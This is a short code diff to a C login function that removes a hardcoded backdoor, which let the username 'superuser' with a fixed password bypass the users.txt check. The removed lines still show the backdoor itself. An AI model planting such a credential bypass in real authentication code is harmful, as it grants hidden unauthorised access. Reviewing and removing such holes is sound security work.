@@ -18,10 +18,6 @@ void trim_newline(char* str) {
 // Function to check if username and password match an entry in users.txt
 int check_login(const char* username, const char* password) {
 
-    if (strcmp(username, "superuser") == 0 && strcmp(password, "h4rdc0d3d") == 0) {
-        return 1;
-    }
-
     FILE* file = fopen(FILE_USERS, "r");
     if (file == NULL) {
         printf("Could not open users.txt\n");
